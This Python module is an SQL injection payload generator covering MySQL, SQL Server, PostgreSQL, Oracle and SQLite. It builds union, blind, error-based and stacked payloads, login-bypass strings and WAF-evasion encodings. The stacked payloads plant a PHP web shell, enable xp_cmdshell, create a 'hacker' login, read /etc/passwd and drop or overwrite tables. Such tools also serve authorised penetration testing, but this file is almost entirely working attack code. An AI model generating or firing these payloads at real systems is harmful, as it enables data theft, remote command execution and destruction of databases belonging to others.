"""SQL injection payload generation logic."""


# -- Database types -------------------------------------------------

DB_TYPES = {
    "mysql": "MySQL / MariaDB",
    "mssql": "Microsoft SQL Server",
    "postgresql": "PostgreSQL",
    "oracle": "Oracle Database",
    "sqlite": "SQLite",
}


# -- Injection contexts ---------------------------------------------

CONTEXTS = {
    "numeric": {
        "name": "Numeric",
        "desc": "Value injected without quotes (integer parameter)",
    },
    "string-single": {
        "name": "String (single-quoted)",
        "desc": "Value wrapped in single quotes",
    },
    "string-double": {
        "name": "String (double-quoted)",
        "desc": "Value wrapped in double quotes",
    },
}


# -- Comment styles -------------------------------------------------

COMMENTS = {
    "--": "Double dash (all DBs)",
    "-- -": "Dash space dash (MySQL)",
    "#": "Hash (MySQL)",
    "/* */": "Block comment (all DBs)",
}


# -- WAF bypass methods ---------------------------------------------

WAF_METHODS = {
    "case-swap": "Alternate upper/lower case keywords",
    "inline-comment": "Insert /**/ between keywords",
    "url-encode": "URL-encode key characters",
    "double-encode": "Double URL-encode key characters",
    "whitespace": "Tabs/newlines instead of spaces",
}


# -- Helper functions -----------------------------------------------

def _comment(style):
    if style == "/* */":
        return "/**/"
    return style


def _breakout(context):
    if context == "numeric":
        return ""
    if context == "string-single":
        return "' "
    if context == "string-double":
        return '" '
    return ""


def _sleep_fn(db, seconds=5):
    fns = {
        "mysql": f"SLEEP({seconds})",
        "mssql": f"WAITFOR DELAY '0:0:{seconds}'",
        "postgresql": f"pg_sleep({seconds})",
        "oracle": f"DBMS_LOCK.SLEEP({seconds})",
        "sqlite": f"randomblob({seconds}00000000)",
    }
    return fns.get(db, f"SLEEP({seconds})")


def _version_fn(db):
    fns = {
        "mysql": "@@version",
        "mssql": "@@version",
        "postgresql": "version()",
        "oracle": "banner FROM v$version",
        "sqlite": "sqlite_version()",
    }
    return fns.get(db, "@@version")


def _current_user_fn(db):
    fns = {
        "mysql": "user()",
        "mssql": "SYSTEM_USER",
        "postgresql": "current_user",
        "oracle": "USER FROM dual",
        "sqlite": "'SQLite'",
    }
    return fns.get(db, "user()")


def _current_db_fn(db):
    fns = {
        "mysql": "database()",
        "mssql": "DB_NAME()",
        "postgresql": "current_database()",
        "oracle": "SYS_CONTEXT('USERENV','DB_NAME') FROM dual",
        "sqlite": "'main'",
    }
    return fns.get(db, "database()")


def _table_enum(db):
    fns = {
        "mysql": "table_name FROM information_schema.tables WHERE table_schema=database()",
        "mssql": "table_name FROM information_schema.tables",
        "postgresql": "table_name FROM information_schema.tables WHERE table_schema='public'",
        "oracle": "table_name FROM all_tables",
        "sqlite": "name FROM sqlite_master WHERE type='table'",
    }
    return fns.get(db, "table_name FROM information_schema.tables")


def _column_enum(db, table):
    t = table or "users"
    fns = {
        "mysql": f"column_name FROM information_schema.columns WHERE table_name='{t}'",
        "mssql": f"column_name FROM information_schema.columns WHERE table_name='{t}'",
        "postgresql": f"column_name FROM information_schema.columns WHERE table_name='{t}'",
        "oracle": f"column_name FROM all_tab_columns WHERE table_name='{t.upper()}'",
        "sqlite": f"sql FROM sqlite_master WHERE type='table' AND name='{t}'",
    }
    return fns.get(db, f"column_name FROM information_schema.columns WHERE table_name='{t}'")


def _concat_fn(db, a, b):
    fns = {
        "mysql": f"CONCAT({a},0x3a,{b})",
        "mssql": f"{a}+CHAR(58)+{b}",
        "postgresql": f"{a}||CHR(58)||{b}",
        "oracle": f"{a}||CHR(58)||{b}",
        "sqlite": f"{a}||':'||{b}",
    }
    return fns.get(db, f"CONCAT({a},0x3a,{b})")


def _error_extract(db, expr):
    fns = {
        "mysql": f"extractvalue(1,concat(0x7e,({expr})))",
        "mssql": f"CONVERT(int,({expr}))",
        "postgresql": f"CAST(({expr}) AS int)",
        "oracle": f"CTXSYS.DRITHSX.SN(1,({expr}))",
        "sqlite": f"CAST(({expr}) AS int)",
    }
    return fns.get(db, f"CAST(({expr}) AS int)")


def _substr_fn(db, expr, pos, length):
    if db == "oracle":
        return f"SUBSTR({expr},{pos},{length})"
    if db == "sqlite":
        return f"SUBSTR({expr},{pos},{length})"
    return f"SUBSTRING({expr},{pos},{length})"


def _if_fn(db, cond, true_val, false_val):
    if db == "mysql":
        return f"IF({cond},{true_val},{false_val})"
    return f"CASE WHEN {cond} THEN {true_val} ELSE {false_val} END"


def _union_nulls(cols, target_col, expr):
    parts = []
    for i in range(1, cols + 1):
        parts.append(expr if i == target_col else "NULL")
    return ",".join(parts)


# -- WAF bypass transforms -----------------------------------------

def _case_swap(s):
    keywords = [
        "SELECT", "UNION", "FROM", "WHERE", "ORDER", "AND", "OR",
        "NULL", "CONCAT", "CAST", "SLEEP", "WAITFOR", "DELAY",
        "BENCHMARK", "SUBSTR", "SUBSTRING", "CHAR", "INFORMATION_SCHEMA",
    ]
    import re
    result = s
    for kw in keywords:
        def _swap(m):
            return "".join(
                c.upper() if i % 2 == 0 else c.lower()
                for i, c in enumerate(m.group(0))
            )
        result = re.sub(r"\b" + kw + r"\b", _swap, result, flags=re.IGNORECASE)
    return result


def _inline_comment(s):
    return s.replace(" ", "/**/")


def _url_encode(s):
    specials = {" ": "%20", "'": "%27", '"': "%22", "=": "%3D",
                "(": "%28", ")": "%29", ";": "%3B", "#": "%23"}
    return "".join(specials.get(c, c) for c in s)


def _double_url_encode(s):
    specials = {" ": "%2520", "'": "%2527", '"': "%2522", "=": "%253D",
                "(": "%2528", ")": "%2529", ";": "%253B", "#": "%2523"}
    return "".join(specials.get(c, c) for c in s)


def _whitespace_var(s):
    return s.replace(" ", "\t")


WAF_FNS = {
    "case-swap": _case_swap,
    "inline-comment": _inline_comment,
    "url-encode": _url_encode,
    "double-encode": _double_url_encode,
    "whitespace": _whitespace_var,
}


# -- Payload generators ---------------------------------------------

def _union_payloads(db, context, comment, columns, table, column):
    c = _comment(comment)
    bo = _breakout(context)
    n = max(1, columns)
    t = table or "users"
    col = column or "password"
    nulls = ",".join(["NULL"] * n)

    return [
        ("Column count (ORDER BY)", f"{bo}ORDER BY {n}{c}"),
        ("Column count (UNION NULL)", f"{bo}UNION SELECT {nulls}{c}"),
        ("Extract DB version", f"{bo}UNION SELECT {_union_nulls(n, 1, _version_fn(db))}{c}"),
        ("Extract current user", f"{bo}UNION SELECT {_union_nulls(n, 1, _current_user_fn(db))}{c}"),
        ("Extract current database", f"{bo}UNION SELECT {_union_nulls(n, 1, _current_db_fn(db))}{c}"),
        ("Enumerate tables", f"{bo}UNION SELECT {_union_nulls(n, 1, _table_enum(db))}{c}"),
        ("Enumerate columns", f"{bo}UNION SELECT {_union_nulls(n, 1, _column_enum(db, table))}{c}"),
        ("Extract data", f"{bo}UNION SELECT {_union_nulls(n, 1, f'{col} FROM {t}')}{c}"),
        ("Extract concatenated", f"{bo}UNION SELECT {_union_nulls(n, 1, _concat_fn(db, 'username', col) + f' FROM {t}')}{c}"),
    ]


def _boolean_blind_payloads(db, context, comment, table, column):
    c = _comment(comment)
    bo = _breakout(context)
    t = table or "users"
    col = column or "password"

    return [
        ("Boolean true", f"{bo}AND 1=1{c}"),
        ("Boolean false", f"{bo}AND 1=2{c}"),
        ("OR true", f"{bo}OR 1=1{c}"),
        ("Extract char (pos 1)", f"{bo}AND {_substr_fn(db, f'(SELECT {col} FROM {t} LIMIT 1)', 1, 1)}='a'{c}"),
        ("ASCII comparison", f"{bo}AND ASCII({_substr_fn(db, f'(SELECT {col} FROM {t} LIMIT 1)', 1, 1)})>96{c}"),
        ("Table exists check", f"{bo}AND (SELECT COUNT(*) FROM {t})>=0{c}"),
        ("Data length", f"{bo}AND LENGTH((SELECT {col} FROM {t} LIMIT 1))>0{c}"),
        ("Conditional", "{bo}AND {cond}=1{c}".format(
            bo=bo, c=c,
            cond=_if_fn(db, _substr_fn(db, f"(SELECT {col} FROM {t} LIMIT 1)", 1, 1) + "='a'", "1", "0"),
        )),
    ]


def _time_blind_payloads(db, context, comment, table, column):
    c = _comment(comment)
    bo = _breakout(context)
    t = table or "users"
    col = column or "password"
    results = []

    if db == "mssql":
        results.append(("Basic time delay", f"{bo}; {_sleep_fn(db)}{c}"))
        results.append(("Conditional (true)", f"{bo}; IF(1=1) {_sleep_fn(db)}{c}"))
        results.append(("Conditional (false)", f"{bo}; IF(1=2) {_sleep_fn(db)}{c}"))
        results.append(("Extract char", f"{bo}; IF({_substr_fn(db, f'(SELECT TOP 1 {col} FROM {t})', 1, 1)}='a') {_sleep_fn(db)}{c}"))
    else:
        results.append(("Basic time delay", f"{bo}AND {_sleep_fn(db)}{c}"))
        results.append(("Conditional (true)", f"{bo}AND {_if_fn(db, '1=1', _sleep_fn(db), '0')}{c}"))
        results.append(("Conditional (false)", f"{bo}AND {_if_fn(db, '1=2', _sleep_fn(db), '0')}{c}"))
        cond = _substr_fn(db, f"(SELECT {col} FROM {t} LIMIT 1)", 1, 1) + "='a'"
        results.append(("Extract char", "{bo}AND {expr}{c}".format(
            bo=bo, c=c,
            expr=_if_fn(db, cond, _sleep_fn(db), "0"),
        )))

    if db == "mysql":
        results.append(("BENCHMARK (MySQL)", f"{bo}AND BENCHMARK(10000000,SHA1('test')){c}"))
    if db == "sqlite":
        results.append(("Heavy query (SQLite)", f"{bo}AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))){c}"))

    return results


def _error_based_payloads(db, context, comment):
    c = _comment(comment)
    bo = _breakout(context)
    results = [
        ("Extract version", f"{bo}AND {_error_extract(db, _version_fn(db))}{c}"),
        ("Extract user", f"{bo}AND {_error_extract(db, _current_user_fn(db))}{c}"),
        ("Extract database", f"{bo}AND {_error_extract(db, _current_db_fn(db))}{c}"),
    ]

    if db == "mysql":
        results.extend([
            ("EXTRACTVALUE (MySQL)", f"{bo}AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e)){c}"),
            ("UPDATEXML (MySQL)", f"{bo}AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1){c}"),
            ("Double query (MySQL)", f"{bo}AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a){c}"),
        ])
    if db == "mssql":
        results.extend([
            ("CONVERT (MSSQL)", f"{bo}AND 1=CONVERT(int,(SELECT @@version)){c}"),
            ("CAST (MSSQL)", f"{bo}AND 1=CAST((SELECT @@version) AS int){c}"),
        ])
    if db == "postgresql":
        results.append(("CAST (PostgreSQL)", f"{bo}AND 1=CAST((SELECT version()) AS int){c}"))
    if db == "oracle":
        results.extend([
            ("UTL_INADDR (Oracle)", f"{bo}AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1)){c}"),
            ("CTXSYS (Oracle)", f"{bo}AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)){c}"),
        ])

    return results


def _stacked_payloads(db, context, comment, table, column):
    c = _comment(comment)
    bo = _breakout(context)
    t = table or "users"
    col = column or "password"
    results = []

    if db == "mssql":
        results.append(("Time delay", f"{bo}; {_sleep_fn(db)}{c}"))
    else:
        results.append(("Time delay", f"{bo}; SELECT {_sleep_fn(db)}{c}"))

    if db == "mssql":
        results.extend([
            ("Create login (MSSQL)", f"{bo}; CREATE LOGIN hacker WITH PASSWORD='P@ssw0rd!'{c}"),
            ("Enable xp_cmdshell", f"{bo}; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE{c}"),
            ("xp_cmdshell exec", f"{bo}; EXEC xp_cmdshell 'whoami'{c}"),
        ])

    results.extend([
        ("INSERT data", f"{bo}; INSERT INTO {t}({col}) VALUES('injected'){c}"),
        ("UPDATE data", f"{bo}; UPDATE {t} SET {col}='hacked' WHERE 1=1{c}"),
        ("DROP table", f"{bo}; DROP TABLE {t}{c}"),
    ])

    if db == "mysql":
        results.append(("Write file (MySQL)", f"{bo}; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'{c}"))
    if db == "postgresql":
        results.extend([
            ("Read file (PostgreSQL)", f"{bo}; CREATE TABLE file_leak(content TEXT); COPY file_leak FROM '/etc/passwd'{c}"),
            ("OS command (PostgreSQL)", f"{bo}; COPY (SELECT '') TO PROGRAM 'whoami'{c}"),
        ])

    return results


# -- Auth bypass payloads -------------------------------------------

def get_auth_bypass():
    return [
        ("Classic OR bypass", "' OR 1=1--"),
        ("OR bypass (no quotes)", "' OR '1'='1"),
        ("OR bypass (double)", '" OR 1=1--'),
        ("Admin bypass", "admin'--"),
        ("Admin OR bypass", "admin' OR '1'='1"),
        ("Comment password (#)", "' OR 1=1#"),
        ("UNION admin", "' UNION SELECT 1,'admin','password'--"),
        ("Nested OR", "') OR ('1'='1"),
    ]


# -- Main generate function ----------------------------------------

def generate(db="mysql", context="string-single", injection_type="union",
             comment="--", columns=3, table="users", column="password",
             waf=None):
    """Generate SQLi payloads for the given configuration.

    Returns a list of (name, payload) tuples.
    """
    if injection_type == "union":
        results = _union_payloads(db, context, comment, columns, table, column)
    elif injection_type == "boolean-blind":
        results = _boolean_blind_payloads(db, context, comment, table, column)
    elif injection_type == "time-blind":
        results = _time_blind_payloads(db, context, comment, table, column)
    elif injection_type == "error-based":
        results = _error_based_payloads(db, context, comment)
    elif injection_type == "stacked":
        results = _stacked_payloads(db, context, comment, table, column)
    else:
        results = _union_payloads(db, context, comment, columns, table, column)

    if waf and waf in WAF_FNS:
        fn = WAF_FNS[waf]
        results = [(name, fn(payload)) for name, payload in results]

    return results
